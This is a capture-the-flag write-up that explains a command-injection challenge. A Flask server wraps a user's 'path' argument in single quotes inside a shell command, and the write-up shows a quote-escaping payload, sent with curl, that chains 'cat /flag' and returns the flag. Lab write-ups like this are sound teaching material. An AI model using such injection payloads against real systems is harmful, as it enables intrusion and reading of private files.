# Command Injection 3

Like the previous challenge, we get a `/challenge/server` that runs a command using `subprocess.run()`. This time, the server injects `arg` into `command`
but encloses `arg` with single quotes like so:

```python
@app.route("/quest", methods=["GET"])
def challenge():
    arg = flask.request.args.get("path", "/challenge")
    command = f"ls -l '{arg}'"

    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout
```

So what should we do about the `'`s? Since we can still control `arg` freely, the best way is to close the single quotes, run our arbritrary command,
and then make sure we close the single quote at the end:

```bash
ls -l '';cat /flag '' 
       ^ arg starts here
```

The first `'` creates the first command `ls -l ''`. This tries to look for a path named "", which doesn't exist. This will throw an error,
but we are okay with that. The `;` chains us to `cat /flag ''`. The opening `'` is from our `arg`, which closes the `'` at the end of `command`.
`cat` tries to read `/flag` and `''`. It successfully cats `/flag`, but will error on the `''`, stating that that file exists. We are okay with that as well.

Therefore, this is the payload:

```bash
curl "challenge.localhost:80/quest?path=';cat%20/flag%20'"
```

Here is the html response:

```html
<b>Output of ls -l '';cat /flag '':</b><br>
    <pre>
        ls: cannot access '': No such file or directory
        flag{good_job}
        cat: '': No such file or directory
    </pre>
```

We see the error messages and the flag in our html response!